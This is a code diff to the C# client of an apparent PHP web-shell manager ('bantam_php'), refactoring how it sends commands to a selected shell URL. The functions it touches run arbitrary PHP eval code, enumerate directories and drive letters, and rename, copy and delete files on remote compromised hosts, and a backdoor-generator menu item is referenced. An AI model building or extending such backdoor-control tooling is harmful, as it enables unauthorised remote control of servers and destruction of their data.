@@ -54,7 +54,7 @@ namespace bantam_php
         /// <param name="e"></param>
         private void BantamMain_Load(object sender, EventArgs e)
         {
-            XmlHelper.loadShells(CONFIG_FILE);
+            //XmlHelper.loadShells(CONFIG_FILE);
         }
 
         /// <summary>
@@ -132,30 +132,13 @@ namespace bantam_php
         #region THREAD_ROUTINES
 
         /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="Code"></param>
-        /// <param name="Callback"></param>
-        /// <param name="CallbackArgs"></param>
-        private async Task<string> startPhpExecutionThread(string phpCode)
-        {
-            if (validTarget() == false)
-            {
-                return "";
-            }
-
-            string result = await Task.Run(() => WebHelper.Request2(g_SelectedShellUrl, phpCode));
-            return result;
-        }
-
-        /// <summary>
         /// Starts a thread that executes the php code
         /// </summary>
         /// <param name="phpCode"></param>
         /// <param name="title"></param>
         public async void executePHPCodeDisplayInRichTextBox(string phpCode, string title)
         {
-            string result = await Task.Run(() => WebHelper.Request2(g_SelectedShellUrl, phpCode));
+            string result = await Task.Run(() => WebHelper.WebRequest(g_SelectedShellUrl, phpCode));
 
             if (string.IsNullOrEmpty(result) == false)
             {
@@ -180,7 +163,7 @@ namespace bantam_php
                 Stopwatch pingWatch = new Stopwatch();
                 pingWatch.Start();
 
-                string result = await WebHelper.Request2(hostTarget, PhpHelper.initDataVars);
+                string result = await WebHelper.WebRequest(hostTarget, PhpHelper.initDataVars);
 
                 if (string.IsNullOrEmpty(result) == false)
                 {
@@ -232,7 +215,7 @@ namespace bantam_php
                     //execute the code and show it in a richtextbox
                     executePHPCodeDisplayInRichTextBox(code, "PHP Eval Result - " + g_SelectedShellUrl);
                 } else {
-                    string result = await startPhpExecutionThread(code);
+                    string result = await WebHelper.WebRequest(g_SelectedShellUrl, code);
                 }
             }
         }
@@ -259,7 +242,7 @@ namespace bantam_php
                 Hosts[g_SelectedShellUrl].PingStopwatch = new Stopwatch();
                 Hosts[g_SelectedShellUrl].PingStopwatch.Start();
 
-                string result = await startPhpExecutionThread(PhpHelper.phpTestExecutionWithEcho);
+                string result = await WebHelper.WebRequest(g_SelectedShellUrl, PhpHelper.phpTestExecutionWithEcho);
 
                 lvi.SubItems[1].Text = Hosts[g_SelectedShellUrl].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
                 Hosts[g_SelectedShellUrl].PingStopwatch.Stop();
@@ -279,7 +262,7 @@ namespace bantam_php
                 return;
             }
 
-            string result = await startPhpExecutionThread(PhpHelper.phpInfo);
+            string result = await WebHelper.WebRequest(g_SelectedShellUrl, PhpHelper.phpInfo);
 
             if (string.IsNullOrEmpty(result) == false)
             {
@@ -512,7 +495,7 @@ namespace bantam_php
             Hosts[shellURL].RequestArgName = requestArgName;
             Hosts[shellURL].SendDataViaCookie = sendViaCookie;
 
-            Program.g_BantamMain.getInitDataThread(shellURL);
+            getInitDataThread(shellURL);
         }
 
         private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
@@ -576,7 +559,7 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        private void btnFileBrowserBack_MouseClick(object sender, EventArgs e)
+        private async void btnFileBrowserBack_MouseClick(object sender, EventArgs e)
         {
             filebrowserGoBack();
         }
@@ -596,7 +579,7 @@ namespace bantam_php
             string hostTarget = g_SelectedShellUrl;
             string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(txtBoxFileBrowserPath.Text, Hosts[g_SelectedShellUrl].PHP_Version);
 
-            string result = await startPhpExecutionThread(directoryContentsPHPCode);
+            string result = await WebHelper.WebRequest(g_SelectedShellUrl, directoryContentsPHPCode);
 
             if (string.IsNullOrEmpty(hostTarget) == false)
             {
@@ -627,7 +610,7 @@ namespace bantam_php
             }
         }
 
-        private void FileBrowserGo(string result, string hostTarget)
+        private async void FileBrowserGo(string result, string hostTarget)
         {
             string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);
 
@@ -711,7 +694,7 @@ namespace bantam_php
             {
                 txtBoxFileBrowserPath.Text = "";
 
-                string result = await startPhpExecutionThread(PhpHelper.getHardDriveLetters);
+                string result = await WebHelper.WebRequest(g_SelectedShellUrl, PhpHelper.getHardDriveLetters);
 
                 if (string.IsNullOrEmpty(result) == false)
                 {
@@ -729,7 +712,7 @@ namespace bantam_php
                 }
             } else {
                 string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(".", Hosts[g_SelectedShellUrl].PHP_Version);
-                string result = await startPhpExecutionThread(directoryContentsPHPCode);
+                string result = await WebHelper.WebRequest(g_SelectedShellUrl, directoryContentsPHPCode);
 
                 if (result != null && result.Length > 0)
                 {
@@ -748,7 +731,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void fileBrowserToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void fileBrowserToolStripMenuItem_Click(object sender, EventArgs e)
         {
             start_FileBrowser();
         }
@@ -772,10 +755,8 @@ namespace bantam_php
                 lastPathRemoved = "/";
             }
 
-            string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(lastPathRemoved, Hosts[g_SelectedShellUrl].PHP_Version);
-            object[] callbackParams = { g_SelectedShellUrl, lastPathRemoved };
-
-            string result = await startPhpExecutionThread(directoryContentsPHPCode);
+            string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(lastPathRemoved, Hosts[hostTarget].PHP_Version);
+            string result = await WebHelper.WebRequest(hostTarget, directoryContentsPHPCode);
 
             if (string.IsNullOrEmpty(hostTarget) == false)
             {
@@ -787,21 +768,19 @@ namespace bantam_php
                 {
                     treeViewFileBrowser.Nodes.Clear();
                     treeViewFileBrowser.Refresh();
-                }
 
-                //patch
-                txtBoxFileBrowserPath.Text = result;
+                    txtBoxFileBrowserPath.Text = lastPathRemoved;
 
-                //set path
-                string path = txtBoxFileBrowserPath?.Text;
-                if (string.IsNullOrEmpty(path))
-                {
-                    path = ".";
-                }
+                    string path = txtBoxFileBrowserPath?.Text;
+                    if (string.IsNullOrEmpty(path))
+                    {
+                        path = ".";
+                    }
 
-                if (result != null && result.Length > 0)
-                {
-                    FileBrowserGo(result, hostTarget);
+                    if (result != null && result.Length > 0)
+                    {
+                        FileBrowserGo(result, hostTarget);
+                    }
                 }
             }
         }
@@ -840,7 +819,7 @@ namespace bantam_php
                    
                     //Get Directory Contents PHP code
                     string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(fullPath, Hosts[g_SelectedShellUrl].PHP_Version);
-                    string result = await startPhpExecutionThread(directoryContentsPHPCode);
+                    string result = await WebHelper.WebRequest(g_SelectedShellUrl, directoryContentsPHPCode);
 
                     if (string.IsNullOrEmpty(result) == false)
                     {
@@ -916,7 +895,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void btnFileBrowserRefresh_Click(object sender, EventArgs e)
+        private async void btnFileBrowserRefresh_Click(object sender, EventArgs e)
         {
             if (validTarget() == false)
             {
@@ -987,7 +966,7 @@ namespace bantam_php
                 string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                 string phpCode = "@rename('" + fileName + "', '" + newFile + "');";
 
-                string result = await startPhpExecutionThread(phpCode);
+                string result = await WebHelper.WebRequest(g_SelectedShellUrl, phpCode);
             }
         }
 
@@ -1010,7 +989,7 @@ namespace bantam_php
             {
                 //todo abstract
                 string phpCode = "@unlink('" + path + "');";
-                string result = await startPhpExecutionThread(phpCode);
+                string result = await WebHelper.WebRequest(g_SelectedShellUrl, phpCode);
             }
         }
 
@@ -1032,7 +1011,7 @@ namespace bantam_php
             if (newFileName != "")
             {
                 string phpCode = "@copy('" + fileName + "', '" + txtBoxFileBrowserPath.Text + "/" + newFileName + "');";
-                string result = await startPhpExecutionThread(phpCode);
+                string result = await WebHelper.WebRequest(g_SelectedShellUrl, phpCode);
             }
         }
 
@@ -1209,7 +1188,7 @@ namespace bantam_php
                 string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                 string phpCode = "@rename('" + fileName + "', '" + newFile + "');";
 
-                string result = await startPhpExecutionThread(phpCode);
+                string result = await WebHelper.WebRequest(g_SelectedShellUrl, phpCode);
             }
         }
 
